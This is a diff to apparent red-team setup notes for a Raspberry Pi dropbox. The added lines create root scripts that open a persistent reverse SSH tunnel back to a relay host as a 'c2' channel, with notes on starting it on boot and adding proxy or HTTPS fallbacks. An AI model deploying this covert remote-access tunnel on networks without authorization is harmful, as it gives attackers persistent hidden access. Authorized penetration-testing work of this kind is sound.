@@ -23,7 +23,7 @@ Connect to relay server over SSH using key_admin, change SSH port, and reconnect
     sudo systemctl restart ssh
     exit
     ssh -i /home/kali/.ssh/key_admin kali@relay.domain.com -p 2222
-
+    #create user pi, create /home/pi/.ssh, chown /home/pi and /home/pi/.ssh to new user, and copy key_pi.pub and key_relay.pub to authorized_keys
 
 
 
@@ -47,7 +47,13 @@ Copy key_pi and key_relay.pub to RPi. Rename key_relay.pub -> authorized_keys
     
 Connect to RPi over SSH using key_admin
 
-    ssh -i /home/kali/.ssh/key_admin kali@10.10.10.10
+    ssh -i /home/kali/.ssh/key_admin root@10.10.10.10
+    echo "ssh -i /home/kali/.ssh/key_pi -R 9001 -f -C -q -N pi@relay.domain.com -p 2222" > /root/startc2.sh
+    chmod 700 /root/startc2.sh
+    echo "kill $(/usr/bin/ps aux | /usr/bin/grep ssh | /usr/bin/grep 2222 | /usr/bin/awk '{print $2}')" > /root/killc2.sh
+    chmod 700 /root/killc2.sh
+    # startc2 on boot
+    # proxy awareness or https channel
     
     
     
@@ -59,5 +65,6 @@ Connect to RPi over SSH using key_admin
     
 
 TODO:
-disable kali account
-move ssh to port 2222
+configure secure local login for pi
+
+
